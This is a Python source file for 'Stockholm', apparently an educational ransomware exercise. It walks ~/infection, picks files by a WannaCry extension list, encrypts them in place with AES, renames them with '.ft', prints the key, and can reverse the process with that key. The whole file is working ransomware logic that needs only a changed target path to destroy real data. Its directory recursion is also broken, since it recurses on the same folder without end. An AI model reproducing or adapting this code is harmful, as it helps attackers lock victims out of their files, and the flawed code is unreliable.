import argparse
import os
import json
from Crypto.Cipher import AES

VERSION = "1.0.0"
TARGETDIR = "~/infection"
EXT = ".ft"

def get_targetdir():
    targetdir = os.path.expanduser(TARGETDIR)
    if not os.path.exists(targetdir):
        print("no target directory. Stop.")
        exit(1)
    return targetdir

def log(silent, msg):
    if (silent):
        return
    print(msg)

def get_targetfiles(dir_path, extends, targets):
    cur_dir = os.listdir(dir_path)
    for file in cur_dir:
        filename = dir_path + "/" + file
        if not os.path.isfile(filename):
            get_targetfiles(dir_path, extends, targets)
        cur_ext = os.path.splitext(filename)
        if len(cur_ext) >= 0 and cur_ext[1] in extends:
            targets.append(filename)
            
def load_extends():
    with open('wannacry_supported_extends.json', 'r', encoding='utf-8') as file:
        exts = json.load(file)
    return exts

def decrypt(silent, file, key):
    try:
        new_filename = file[:-len(EXT)]
        log(silent, f"decrypting {file}")
        with open(file, 'r+b') as f:
            content = f.read()
            nonce = content[:16]
            tag = content[16:32]
            ciphertext = content[32:]
            cipher = AES.new(key, AES.MODE_EAX, nonce)
            data = cipher.decrypt_and_verify(ciphertext, tag)
            f.truncate(0)
            f.write(data)
        os.rename(file, new_filename)
        log(silent, f"{new_filename} successfuly decrypted")
    except Exception as e:
        log(silent, f"failed to decrypt {new_filename}")
        print(f"Error: {e}")

def encrypt(silent, file, key):
    try:
        if not file.endswith(EXT):
            new_filename = file + EXT
        else:
            new_filename = file
        log(silent, f"encrypting {file}")
        with open(file, 'rb') as f:
            content = f.read()
        cipher = AES.new(key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(content)
        new_content = cipher.nonce + tag + ciphertext
        with open(file, 'wb') as f:
            f.write(new_content)
        os.rename(file, new_filename)
        log(silent, f"{new_filename} successfuly encrypted")
    except Exception as e:
        log(silent, f"failed to encrypt {new_filename}")
        print(f"Error: {e}")

def stockholm(reverse, silent, key):
    if (key):
        Key = bytes.fromhex(key)
    else:
        Key = os.urandom(32)
    dir_path = get_targetdir()
    targets = []
    if reverse:
        get_targetfiles(dir_path, [EXT], targets)
    else:
        get_targetfiles(dir_path, load_extends(), targets)
    if not targets:
        print("no target. Stop.")
        exit(1)
    for file in targets:
        if reverse:
            decrypt(silent, file, Key)
        else:
            encrypt(silent, file, Key)
    if (not reverse):
        print(f"files encrypted with key: {Key.hex()}")

def get_args():
    parser = argparse.ArgumentParser()

    #parser.add_argument("-h", "--help", action="store_true", help="shows program's options")
    parser.add_argument("-v", "--version", action="store_true", help="shows programm's version")
    parser.add_argument("-r", "--reverse", metavar="key", help="to use with a key entered as argument to reverse the infection", type=str)
    parser.add_argument("-s", "--silent", action="store_true", help="no output will be produced")
    return parser

def main():
    args = get_args().parse_args()

    if (args.version):
        print(f"Stockholm version {VERSION}")

    try:
        if (args.reverse):
            stockholm(args.reverse, args.silent, args.reverse)
        else:
            stockholm(args.reverse, args.silent, 0)

    except Exception as e:
        print(f"lol {e}")
        exit(1)


if __name__ == '__main__':
    main()